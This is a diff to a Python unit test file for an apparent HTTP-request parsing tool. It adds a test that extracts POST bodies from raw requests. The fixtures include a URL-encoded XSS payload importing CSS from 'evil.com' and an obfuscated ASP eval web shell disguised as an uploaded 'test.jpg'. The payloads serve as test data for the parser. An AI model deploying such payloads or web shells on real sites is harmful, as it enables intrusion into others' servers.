@@ -29,7 +29,7 @@ class TestAutoTester(unittest.TestCase):
         # 验证上面中的每一项都在函数执行的返回结果中
         self.assertTrue(
             all(
-                [x in self.auto_tester.get_http_headers_list() for x in right_answer]
+                [x in self.auto_tester.get_http_headers_dict() for x in right_answer]
             )
         )
 
@@ -58,6 +58,17 @@ class TestAutoTester(unittest.TestCase):
         my_url, my_http_header = self.auto_tester.parse_http_header(test_http)
         self.assertEqual(my_url, right_url)
         self.assertEqual(my_http_header, right_header)
+
+    def test_get_post_data_from_http_header(self):
+        test_data = "POST /simple.php HTTP/1.1\\r\\nHost: 10.0.1.70\\r\\nConnection: keep-alive\\r\\nContent-Length: 113\\r\\nCache-Control: max-age=0\\r\\nOrigin: http://10.0.1.70\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nReferer: http://10.0.1.70/simple.php\\r\\nAccept-Encoding: gzip,deflate,sdch\\r\\nAccept-Language: zh-CN,zh;q=0.8\\r\\nAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3\\r\\n\\r\\ninput=%3CSTYLE%3E%40%5C0069mport+%27http%3A%2F%2Fevil.com%2Fevil.css%27%3C%2FSTYLE%3E++&%CC%E1%BD%BB=%CC%E1%BD%BB"
+        right_answer = "input=%3CSTYLE%3E%40%5C0069mport+%27http%3A%2F%2Fevil.com%2Fevil.css%27%3C%2FSTYLE%3E++&%CC%E1%BD%BB=%CC%E1%BD%BB"
+        my_answer = self.auto_tester.get_post_data_from_http_header(test_data)
+        self.assertEqual(right_answer, my_answer)
+
+        test_data = "POST /jiayu/upload.php HTTP/1.1\\r\\nHost: 140.0.105.2\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\nAccept-Encoding: gzip, deflate\\r\\nReferer: http://140.0.105.2/jiayu/upload.php\\r\\nConnection: keep-alive\\r\\nContent-Type: multipart/form-data; boundary=---------------------------14597222655846\\r\\nContent-Length: 385\\r\\n\\r\\n-----------------------------14597222655846\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n<%eval\"\"&(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0\"&\"-\"&\"2\"&\"-\"&\"5\"&\")\"&\")\")%>110\\r\\n-----------------------------14597222655846\\r\\nContent-Disposition: form-data; name=\"submit\"\\r\\n\\r\\nSubmit\\r\\n-----------------------------14597222655846--\\r\\n"
+        right_answer = "-----------------------------14597222655846\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<%eval\"\"&(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0\"&\"-\"&\"2\"&\"-\"&\"5\"&\")\"&\")\")%>110\r\n-----------------------------14597222655846\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit\r\n-----------------------------14597222655846--\r\n"
+        my_answer = self.auto_tester.get_post_data_from_http_header(test_data)
+        self.assertEqual(right_answer, my_answer)
 
 
 if __name__ == "__main__":
